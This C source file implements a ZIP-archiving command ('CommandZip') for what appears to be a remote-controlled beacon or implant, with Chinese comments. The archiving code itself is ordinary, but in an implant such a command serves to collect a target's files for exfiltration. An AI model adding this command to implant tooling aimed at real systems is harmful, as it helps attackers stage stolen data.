#include "beacon_commands.h"

#include <stdarg.h>

/* 每个归档的统计信息 */
typedef struct ZipStats {
    UINT32 files;
    UINT32 dirs;
    UINT32 skipped;
    UINT64 bytes_in;
    UINT64 bytes_out;
    UINT32 entries;
} ZipStats;

/* 归档创建过程中共享的上下文 */
typedef struct ZipContext {
    HANDLE out;
    ByteBuf central;
    const WCHAR* base;
    const WCHAR* zip_abs;
    ZipStats* stats;
    CHAR error[160];
} ZipContext;

/* CRC-32 查找表和初始化标志 */
static UINT32 g_crc32_table[256];
static INT g_crc32_ready;

/* 初始化 CRC-32 查找表（仅执行一次） */
static VOID ZipCrc32Init(VOID)
{
    UINT32 i;
    if (g_crc32_ready) {
        return;
    }
    for (i = 0; i < 256u; ++i) {
        UINT32 c = i;
        INT k;
        for (k = 0; k < 8; ++k) {
            c = (c & 1u) ? (0xedb88320u ^ (c >> 1)) : (c >> 1);
        }
        g_crc32_table[i] = c;
    }
    g_crc32_ready = 1;
}

/* 将 C 字符串以数据包就绪数组形式打包到 ByteBuf 中 */
static ByteBuf ZipPackText(const CHAR* text)
{
    ByteBuf out;
    BbInit(&out);
    PacketArrayBytes(&out, text, text ? strlen(text) : 0);
    return out;
}

/* 将错误消息格式化到上下文错误缓冲区 */
static INT ZipSetError(ZipContext* ctx, const CHAR* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(ctx->error, sizeof(ctx->error), fmt, ap);
    va_end(ap);
    return 0;
}

/* 向 ByteBuf 追加小端序 16 位值 */
static VOID ZipAppendLe16(ByteBuf* b, UINT16 v)
{
    BYTE8 d[2];
    d[0] = (BYTE8)(v & 0xffu);
    d[1] = (BYTE8)((v >> 8) & 0xffu);
    BbAppend(b, d, sizeof(d));
}

/* 向 ByteBuf 追加小端序 32 位值 */
static VOID ZipAppendLe32(ByteBuf* b, UINT32 v)
{
    BYTE8 d[4];
    d[0] = (BYTE8)(v & 0xffu);
    d[1] = (BYTE8)((v >> 8) & 0xffu);
    d[2] = (BYTE8)((v >> 16) & 0xffu);
    d[3] = (BYTE8)((v >> 24) & 0xffu);
    BbAppend(b, d, sizeof(d));
}

/* 向文件直接写入小端序 16 位值 */
static INT ZipWriteLe16(HANDLE f, UINT16 v)
{
    BYTE8 d[2];
    DWORD written = 0;
    d[0] = (BYTE8)(v & 0xffu);
    d[1] = (BYTE8)((v >> 8) & 0xffu);
    return WriteFile(f, d, sizeof(d), &written, NULL) && written == sizeof(d);
}

/* 向文件直接写入小端序 32 位值 */
static INT ZipWriteLe32(HANDLE f, UINT32 v)
{
    BYTE8 d[4];
    DWORD written = 0;
    d[0] = (BYTE8)(v & 0xffu);
    d[1] = (BYTE8)((v >> 8) & 0xffu);
    d[2] = (BYTE8)((v >> 16) & 0xffu);
    d[3] = (BYTE8)((v >> 24) & 0xffu);
    return WriteFile(f, d, sizeof(d), &written, NULL) && written == sizeof(d);
}

/* 不区分大小写的宽路径比较 */
static INT ZipSamePath(const WCHAR* a, const WCHAR* b)
{
    return _wcsicmp(a, b) == 0;
}

/* 检查宽字符是否为路径分隔符 */
static INT ZipIsSlash(WCHAR c)
{
    return c == L'\\' || c == L'/';
}

/* 从宽路径中移除尾部斜杠/反斜杠（保留根路径如 C:\） */
static VOID ZipStripTrailingSlash(WCHAR* path)
{
    SIZE_T len;
    if (!path) {
        return;
    }
    len = wcslen(path);
    while (len > 3 && ZipIsSlash(path[len - 1])) {
        path[--len] = 0;
    }
}

/* 将路径解析为完整的绝对路径 */
static WCHAR* ZipFullPath(const WCHAR* path)
{
    DWORD need = GetFullPathNameW(path, 0, NULL, NULL);
    WCHAR* out;
    if (need == 0) {
        return HeapStrDupW(path);
    }
    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)((SIZE_T)need + 1u)*(sizeof(WCHAR)));
    if (!out) {
        return NULL;
    }
    if (GetFullPathNameW(path, need, out, NULL) == 0) {
        HeapFree(GetProcessHeap(), 0, (out));
        return HeapStrDupW(path);
    }
    ZipStripTrailingSlash(out);
    return out;
}

/* 从路径中提取父目录 */
static WCHAR* ZipParentPath(const WCHAR* path)
{
    WCHAR* out = HeapStrDupW(path);
    WCHAR* slash1;
    WCHAR* slash2;
    WCHAR* slash;

    if (!out) {
        return NULL;
    }

    ZipStripTrailingSlash(out);
    slash1 = wcsrchr(out, L'\\');
    slash2 = wcsrchr(out, L'/');
    slash = slash1 > slash2 ? slash1 : slash2;
    if (!slash) {
        HeapFree(GetProcessHeap(), 0, (out));
        return HeapStrDupW(L".");
    }
    /* 处理驱动器根目录（C:\）和 UNC 根目录（\\） */
    if (slash == out + 2 && out[1] == L':') {
        slash[1] = 0;
    } else if (slash == out) {
        slash[1] = 0;
    } else {
        *slash = 0;
    }
    return out;
}

/* 以反斜杠分隔符合并两个路径组件 */
static WCHAR* ZipJoinPath(const WCHAR* left, const WCHAR* right)
{
    SIZE_T left_len = left ? wcslen(left) : 0;
    SIZE_T right_len = right ? wcslen(right) : 0;
    INT need_sep;
    WCHAR* out;

    if (left_len == 0) {
        return HeapStrDupW(right ? right : L"");
    }

    /* 若左侧未以分隔符结尾则插入分隔符 */
    need_sep = !ZipIsSlash(left[left_len - 1]);
    out = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(left_len + (need_sep ? 1u : 0u) + right_len + 1u)*(sizeof(WCHAR)));
    if (!out) {
        return NULL;
    }
    wcscpy_s(out, left_len + 1u, left);
    if (need_sep) {
        out[left_len++] = L'\\';
    }
    if (right_len) {
        wcscpy_s(out + left_len, right_len + 1u, right);
    }
    return out;
}

/* 计算 'path' 相对于 'base' 的相对路径 */
static WCHAR* ZipRelativePath(const WCHAR* base, const WCHAR* path)
{
    SIZE_T base_len = wcslen(base);
    const WCHAR* rel;
    if (_wcsnicmp(base, path, base_len) != 0) {
        return HeapStrDupW(path);
    }
    rel = path + base_len;
    /* 跳过前导分隔符 */
    while (ZipIsSlash(*rel)) {
        ++rel;
    }
    return HeapStrDupW(rel);
}

/* 将宽相对路径转换为使用正斜杠的 UTF-8；为目录追加 '/' */
static CHAR* ZipNameUtf8(const WCHAR* rel, INT is_dir)
{
    CHAR* name = WideToUtf8(rel);
    SIZE_T i;
    SIZE_T len;
    CHAR* out;
    if (!name) {
        return NULL;
    }
    /* 将反斜杠规范化为正斜杠以适配 ZIP 格式 */
    for (i = 0; name[i]; ++i) {
        if (name[i] == '\\') {
            name[i] = '/';
        }
    }
    if (!is_dir) {
        return name;
    }
    len = strlen(name);
    if (len > 0 && name[len - 1] == '/') {
        return name;
    }
    /* 为目录条目追加尾部斜杠 */
    out = (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len + 2u)*(1));
    if (!out) {
        HeapFree(GetProcessHeap(), 0, (name));
        return NULL;
    }
    memcpy(out, name, len);
    out[len] = '/';
    HeapFree(GetProcessHeap(), 0, (name));
    return out;
}

/* 将 FILETIME 转换为用于 ZIP 头部的 DOS 日期/时间格式 */
static VOID ZipDosTime(FILETIME ft, UINT16* dos_date, UINT16* dos_time)
{
    FILETIME local;
    *dos_date = 0;
    *dos_time = 0;
    if (FileTimeToLocalFileTime(&ft, &local)) {
        FileTimeToDosDateTime(&local, dos_date, dos_time);
    }
}

/* 计算给定文件路径的 CRC-32 和文件大小 */
static INT ZipFileCrcSize(const WCHAR* path, UINT32* crc, UINT64* size)
{
    HANDLE f = INVALID_HANDLE_VALUE;
    BYTE8 buf[32768];
    DWORD n;
    UINT32 c = 0xffffffffu;

    ZipCrc32Init();
    *size = 0;
    *crc = 0;
    f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        return 0;
    }
    /* 分块读取文件并累积 CRC */
    for (;;) {
        DWORD i;
        if (!ReadFile(f, buf, sizeof(buf), &n, NULL)) {
            CloseHandle(f);
            return 0;
        }
        if (n == 0) break;
        for (i = 0; i < n; ++i) {
            c = g_crc32_table[(c ^ buf[i]) & 0xffu] ^ (c >> 8);
        }
        *size += (UINT64)n;
    }
    CloseHandle(f);
    *crc = c ^ 0xffffffffu;
    return 1;
}

/* 将源文件内容复制到输出文件流 */
static INT ZipCopyFile(HANDLE out, const WCHAR* path)
{
    HANDLE f = INVALID_HANDLE_VALUE;
    BYTE8 buf[32768];
    DWORD n;
    DWORD written;
    INT ok = 1;

    f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        return 0;
    }
    for (;;) {
        if (!ReadFile(f, buf, sizeof(buf), &n, NULL)) {
            ok = 0;
            break;
        }
        if (n == 0) break;
        if (!WriteFile(out, buf, n, &written, NULL) || written != n) {
            ok = 0;
            break;
        }
    }
    CloseHandle(f);
    return ok;
}

/* 为一个文件/目录追加中央目录条目 */
static INT ZipAddCentral(ZipContext* ctx, const CHAR* name, UINT16 dos_date, UINT16 dos_time,
                         UINT32 crc, UINT32 size, UINT32 offset, INT is_dir)
{
    SIZE_T name_len = strlen(name);
    if (name_len > 0xffffu || ctx->stats->entries >= 0xffffu) {
        return ZipSetError(ctx, "zip format limit exceeded");
    }

    /* 写入中央目录文件头（PK 0x0201） */
    ZipAppendLe32(&ctx->central, 0x02014b50u);
    ZipAppendLe16(&ctx->central, 20);
    ZipAppendLe16(&ctx->central, 20);
    ZipAppendLe16(&ctx->central, 0x0800u);
    ZipAppendLe16(&ctx->central, 0);
    ZipAppendLe16(&ctx->central, dos_time);
    ZipAppendLe16(&ctx->central, dos_date);
    ZipAppendLe32(&ctx->central, crc);
    ZipAppendLe32(&ctx->central, size);
    ZipAppendLe32(&ctx->central, size);
    ZipAppendLe16(&ctx->central, (UINT16)name_len);
    ZipAppendLe16(&ctx->central, 0);
    ZipAppendLe16(&ctx->central, 0);
    ZipAppendLe16(&ctx->central, 0);
    ZipAppendLe16(&ctx->central, 0);
    ZipAppendLe32(&ctx->central, is_dir ? 0x10u : 0x80u);
    ZipAppendLe32(&ctx->central, offset);
    BbAppend(&ctx->central, name, name_len);
    ++ctx->stats->entries;
    return 1;
}

/* 向 ZIP 归档中写入单个文件或目录条目 */
static INT ZipWriteEntry(ZipContext* ctx, const WCHAR* path, DWORD attrs, const WIN32_FIND_DATAW* fd)
{
    WCHAR* rel = NULL;
    CHAR* name = NULL;
    UINT16 dos_date;
    UINT16 dos_time;
    UINT32 crc = 0;
    UINT64 size64 = 0;
    UINT32 size32 = 0;
    UINT64 offset64;
    UINT32 offset32;
    INT is_dir = (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0;
    FILETIME write_time = {0, 0};
    SIZE_T name_len;

    /* 跳过重分析点、归档本身和设备文件 */
    if (attrs & FILE_ATTRIBUTE_REPARSE_POINT) {
        ++ctx->stats->skipped;
        return 1;
    }
    if (ZipSamePath(path, ctx->zip_abs)) {
        ++ctx->stats->skipped;
        return 1;
    }
    if (!is_dir && (attrs & FILE_ATTRIBUTE_DEVICE)) {
        ++ctx->stats->skipped;
        return 1;
    }

    /* 计算相对条目名称 */
    rel = ZipRelativePath(ctx->base, path);
    if (!rel || !*rel) {
        HeapFree(GetProcessHeap(), 0, (rel));
        return 1;
    }
    name = ZipNameUtf8(rel, is_dir);
    HeapFree(GetProcessHeap(), 0, (rel));
    if (!name) {
        return ZipSetError(ctx, "allocation failed");
    }
    name_len = strlen(name);
    if (name_len == 0 || name_len > 0xffffu) {
        HeapFree(GetProcessHeap(), 0, (name));
        return ZipSetError(ctx, "zip entry name is too long");
    }

    /* 计算常规文件的 CRC 和大小 */
    if (!is_dir) {
        if (!ZipFileCrcSize(path, &crc, &size64)) {
            HeapFree(GetProcessHeap(), 0, (name));
            return ZipSetError(ctx, "failed to read source file");
        }
        if (size64 > 0xffffffffull) {
            HeapFree(GetProcessHeap(), 0, (name));
            return ZipSetError(ctx, "file exceeds ZIP32 size limit");
        }
        size32 = (UINT32)size64;
    }

    /* 记录本地头的当前偏移量 */
    {
        LARGE_INTEGER pos;
        pos.QuadPart = 0;
        if (!SetFilePointerEx(ctx->out, pos, &pos, FILE_CURRENT)) {
            HeapFree(GetProcessHeap(), 0, (name));
            return ZipSetError(ctx, "failed to get file position");
        }
        offset64 = (UINT64)pos.QuadPart;
    }
    if (offset64 > 0xffffffffull) {
        HeapFree(GetProcessHeap(), 0, (name));
        return ZipSetError(ctx, "zip exceeds ZIP32 offset limit");
    }
    offset32 = (UINT32)offset64;
    if (fd) {
        write_time = fd->ftLastWriteTime;
    }
    ZipDosTime(write_time, &dos_date, &dos_time);

    /* 写入本地文件头（PK 0x0403）和条目名称 */
    {
        DWORD name_written = 0;
        if (!ZipWriteLe32(ctx->out, 0x04034b50u) ||
            !ZipWriteLe16(ctx->out, 20) ||
            !ZipWriteLe16(ctx->out, 0x0800u) ||
            !ZipWriteLe16(ctx->out, 0) ||
            !ZipWriteLe16(ctx->out, dos_time) ||
            !ZipWriteLe16(ctx->out, dos_date) ||
            !ZipWriteLe32(ctx->out, crc) ||
            !ZipWriteLe32(ctx->out, size32) ||
            !ZipWriteLe32(ctx->out, size32) ||
            !ZipWriteLe16(ctx->out, (UINT16)name_len) ||
            !ZipWriteLe16(ctx->out, 0) ||
            !WriteFile(ctx->out, name, (DWORD)name_len, &name_written, NULL) ||
            name_written != name_len) {
            HeapFree(GetProcessHeap(), 0, (name));
            return ZipSetError(ctx, "failed to write zip header");
        }
    }

    /* 写入文件数据（存储模式，无压缩） */
    if (!is_dir && !ZipCopyFile(ctx->out, path)) {
        HeapFree(GetProcessHeap(), 0, (name));
        return ZipSetError(ctx, "failed to write zip file data");
    }

    /* 在中央目录中记录条目 */
    if (!ZipAddCentral(ctx, name, dos_date, dos_time, crc, size32, offset32, is_dir)) {
        HeapFree(GetProcessHeap(), 0, (name));
        return 0;
    }

    /* 更新归档统计信息 */
    if (is_dir) {
        ++ctx->stats->dirs;
    } else {
        ++ctx->stats->files;
        ctx->stats->bytes_in += size64;
    }
    HeapFree(GetProcessHeap(), 0, (name));
    return 1;
}

/* 递归遍历目录并将所有条目添加到归档 */
static INT ZipWalkDir(ZipContext* ctx, const WCHAR* dir)
{
    WCHAR* pattern = ZipJoinPath(dir, L"*");
    WIN32_FIND_DATAW fd;
    HANDLE find;

    if (!pattern) {
        return ZipSetError(ctx, "allocation failed");
    }
    find = FindFirstFileW(pattern, &fd);
    HeapFree(GetProcessHeap(), 0, (pattern));
    if (find == INVALID_HANDLE_VALUE) {
        return ZipSetError(ctx, "failed to enumerate source directory: %lu", (unsigned long)GetLastError());
    }

    /* 遍历目录条目 */
    do {
        WCHAR* child;
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) {
            continue;
        }
        child = ZipJoinPath(dir, fd.cFileName);
        if (!child) {
            FindClose(find);
            return ZipSetError(ctx, "allocation failed");
        }
        if (!ZipWriteEntry(ctx, child, fd.dwFileAttributes, &fd)) {
            HeapFree(GetProcessHeap(), 0, (child));
            FindClose(find);
            return 0;
        }
        /* 递归进入子目录（跳过重分析点和归档本身） */
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            !(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) &&
            !ZipSamePath(child, ctx->zip_abs)) {
            if (!ZipWalkDir(ctx, child)) {
                HeapFree(GetProcessHeap(), 0, (child));
                FindClose(find);
                return 0;
            }
        }
        HeapFree(GetProcessHeap(), 0, (child));
    } while (FindNextFileW(find, &fd));

    FindClose(find);
    return 1;
}

/* 顶层归档创建：验证输入、遍历源、写入中央目录和 EOCD */
static INT ZipCreateArchive(const WCHAR* source_abs, const WCHAR* zip_abs, INT overwrite,
                            INT include_root, ZipStats* stats, CHAR* error, SIZE_T error_len)
{
    DWORD source_attrs;
    WCHAR* zip_parent = NULL;
    WCHAR* base = NULL;
    HANDLE out = INVALID_HANDLE_VALUE;
    ZipContext ctx;
    WIN32_FIND_DATAW fd;
    HANDLE find;
    UINT64 central_offset64;
    UINT64 central_size64;

    /* 验证源路径 */
    memset(stats, 0, sizeof(*stats));
    error[0] = 0;
    source_attrs = GetFileAttributesW(source_abs);
    if (source_attrs == INVALID_FILE_ATTRIBUTES) {
        snprintf(error, error_len, "source_path is not accessible: %lu", (unsigned long)GetLastError());
        return 0;
    }
    if (source_attrs & FILE_ATTRIBUTE_REPARSE_POINT) {
        snprintf(error, error_len, "source_path must not be a reparse point");
        return 0;
    }
    if (ZipSamePath(source_abs, zip_abs)) {
        snprintf(error, error_len, "zip_path must be different from source_path");
        return 0;
    }

    /* 确保 zip 父目录存在 */
    zip_parent = ZipParentPath(zip_abs);
    if (!zip_parent) {
        snprintf(error, error_len, "allocation failed");
        return 0;
    }
    {
        DWORD parent_attrs = GetFileAttributesW(zip_parent);
        if (parent_attrs == INVALID_FILE_ATTRIBUTES || (parent_attrs & FILE_ATTRIBUTE_DIRECTORY) == 0) {
            snprintf(error, error_len, "zip parent path is not a directory");
            HeapFree(GetProcessHeap(), 0, (zip_parent));
            return 0;
        }
    }
    HeapFree(GetProcessHeap(), 0, (zip_parent));

    /* 检查覆盖权限 */
    if (!overwrite && GetFileAttributesW(zip_abs) != INVALID_FILE_ATTRIBUTES) {
        snprintf(error, error_len, "zip_path already exists");
        return 0;
    }

    /* 打开输出 zip 文件 */
    out = CreateFileW(zip_abs, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (out == INVALID_HANDLE_VALUE) {
        snprintf(error, error_len, "failed to create zip_path");
        return 0;
    }

    /* 初始化上下文和中央目录缓冲区 */
    BbInit(&ctx.central);
    ctx.out = out;
    ctx.zip_abs = zip_abs;
    ctx.stats = stats;
    ctx.error[0] = 0;

    /* 确定用于计算相对条目名称的基础路径 */
    base = ((source_attrs & FILE_ATTRIBUTE_DIRECTORY) && !include_root) ? HeapStrDupW(source_abs) : ZipParentPath(source_abs);
    if (!base) {
        strcpy_s(ctx.error, sizeof(ctx.error), "allocation failed");
    } else {
        ctx.base = base;
        if (source_attrs & FILE_ATTRIBUTE_DIRECTORY) {
            /* 遍历目录树 */
            if (include_root) {
                find = FindFirstFileW(source_abs, &fd);
                if (find == INVALID_HANDLE_VALUE) {
                    strcpy_s(ctx.error, sizeof(ctx.error), "failed to stat source directory");
                } else {
                    if (!ZipWriteEntry(&ctx, source_abs, source_attrs, &fd) || !ZipWalkDir(&ctx, source_abs)) {
                        /* ctx.error 已设置 */
                    }
                    FindClose(find);
                }
            } else if (!ZipWalkDir(&ctx, source_abs)) {
                /* ctx.error 已设置 */
            }
        } else {
            /* 单文件归档 */
            find = FindFirstFileW(source_abs, &fd);
            if (find == INVALID_HANDLE_VALUE) {
                strcpy_s(ctx.error, sizeof(ctx.error), "failed to stat source file");
            } else {
                (void)ZipWriteEntry(&ctx, source_abs, source_attrs, &fd);
                FindClose(find);
            }
        }
    }

    /* 写入中央目录和中央目录结束记录 */
    {
        LARGE_INTEGER zero_pos;
        LARGE_INTEGER cur_pos;
        zero_pos.QuadPart = 0;
        if (!SetFilePointerEx(out, zero_pos, &cur_pos, FILE_CURRENT)) {
            strcpy_s(ctx.error, sizeof(ctx.error), "failed to get zip write position");
            central_offset64 = 0;
        } else {
            central_offset64 = (UINT64)cur_pos.QuadPart;
        }
    }
    central_size64 = (UINT64)ctx.central.len;
    if (!ctx.error[0]) {
        DWORD central_written = 0;
        if (central_offset64 > 0xffffffffull || central_size64 > 0xffffffffull) {
            strcpy_s(ctx.error, sizeof(ctx.error), "zip exceeds ZIP32 central directory limit");
        } else if (!WriteFile(out, ctx.central.data, (DWORD)ctx.central.len, &central_written, NULL) ||
                   central_written != ctx.central.len ||
                   !ZipWriteLe32(out, 0x06054b50u) ||
                   !ZipWriteLe16(out, 0) ||
                   !ZipWriteLe16(out, 0) ||
                   !ZipWriteLe16(out, (UINT16)stats->entries) ||
                   !ZipWriteLe16(out, (UINT16)stats->entries) ||
                   !ZipWriteLe32(out, (UINT32)central_size64) ||
                   !ZipWriteLe32(out, (UINT32)central_offset64) ||
                   !ZipWriteLe16(out, 0)) {
            strcpy_s(ctx.error, sizeof(ctx.error), "failed to finalize zip");
        }
    }

    /* 记录最终输出大小 */
    if (!ctx.error[0]) {
        LARGE_INTEGER zero_pos;
        LARGE_INTEGER end_pos;
        zero_pos.QuadPart = 0;
        if (SetFilePointerEx(out, zero_pos, &end_pos, FILE_CURRENT)) {
            stats->bytes_out = (UINT64)end_pos.QuadPart;
        }
    }

    CloseHandle(out);
    BbFree(&ctx.central);
    HeapFree(GetProcessHeap(), 0, (base));

    /* 出错时删除不完整的归档 */
    if (ctx.error[0]) {
        DeleteFileW(zip_abs);
        snprintf(error, error_len, "%s", ctx.error);
        return 0;
    }
    return 1;
}

/* 命令入口点：解析参数并创建 ZIP 归档 */
ByteBuf CommandZip(Parser* p)
{
    UINT32 arg_count = ParserU32(p);
    CHAR* source_utf8;
    CHAR* zip_utf8;
    WCHAR* source_wide;
    WCHAR* zip_wide;
    WCHAR* source_abs;
    WCHAR* zip_abs;
    UINT32 overwrite;
    UINT32 include_root;
    ZipStats stats;
    CHAR error[192];
    ByteBuf result;

    /* 验证参数数量 */
    if (arg_count != 4) {
        CHAR msg[128];
        snprintf(msg, sizeof(msg), "zip failed: requires 4 arguments (source_path, zip_path, overwrite, include_root), got %lu",
                 (unsigned long)arg_count);
        return ZipPackText(msg);
    }

    /* 解析命令参数 */
    source_utf8 = ParserString(p);
    zip_utf8 = ParserString(p);
    overwrite = ParserU32(p);
    include_root = ParserU32(p);
    if (p->error[0]) {
        CHAR msg[192];
        snprintf(msg, sizeof(msg), "zip failed: %s", p->error);
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        return ZipPackText(msg);
    }

    /* 验证布尔标志 */
    if (overwrite > 1u) {
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        return ZipPackText("zip failed: overwrite must be 0 or 1");
    }
    if (include_root > 1u) {
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        return ZipPackText("zip failed: include_root must be 0 or 1");
    }

    /* 验证必需的字符串参数 */
    if (!source_utf8 || source_utf8[0] == 0) {
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        return ZipPackText("zip failed: source_path is required");
    }
    if (!zip_utf8 || zip_utf8[0] == 0) {
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        return ZipPackText("zip failed: zip_path is required");
    }

    /* 将路径转换为宽字符并解析为绝对路径 */
    source_wide = Utf8ToWide(source_utf8);
    zip_wide = Utf8ToWide(zip_utf8);
    source_abs = source_wide ? ZipFullPath(source_wide) : NULL;
    zip_abs = zip_wide ? ZipFullPath(zip_wide) : NULL;
    if (!source_wide || !zip_wide || !source_abs || !zip_abs) {
        HeapFree(GetProcessHeap(), 0, (source_utf8));
        HeapFree(GetProcessHeap(), 0, (zip_utf8));
        HeapFree(GetProcessHeap(), 0, (source_wide));
        HeapFree(GetProcessHeap(), 0, (zip_wide));
        HeapFree(GetProcessHeap(), 0, (source_abs));
        HeapFree(GetProcessHeap(), 0, (zip_abs));
        return ZipPackText("zip failed: allocation failed");
    }

    /* 创建归档 */
    if (!ZipCreateArchive(source_abs, zip_abs, (INT)overwrite, (INT)include_root,
                          &stats, error, sizeof(error))) {
        CHAR msg[256];
        snprintf(msg, sizeof(msg), "zip failed: %s", error);
        result = ZipPackText(msg);
    } else {
        /* 构建包含统计信息的成功响应 */
        ByteBuf text;
        BbInit(&text);
        BbPrintf(&text,
                  "zip success: source=%s zip=%s files=%lu dirs=%lu skipped=%lu bytes_in=%I64u bytes_out=%I64u",
                  source_utf8,
                  zip_utf8,
                  (unsigned long)stats.files,
                  (unsigned long)stats.dirs,
                  (unsigned long)stats.skipped,
                  (unsigned __int64)stats.bytes_in,
                  (unsigned __int64)stats.bytes_out);
        result = ZipPackText((const CHAR*)text.data);
        BbFree(&text);
    }

    /* 清理所有已分配的资源 */
    HeapFree(GetProcessHeap(), 0, (source_utf8));
    HeapFree(GetProcessHeap(), 0, (zip_utf8));
    HeapFree(GetProcessHeap(), 0, (source_wide));
    HeapFree(GetProcessHeap(), 0, (zip_wide));
    HeapFree(GetProcessHeap(), 0, (source_abs));
    HeapFree(GetProcessHeap(), 0, (zip_abs));
    return result;
}
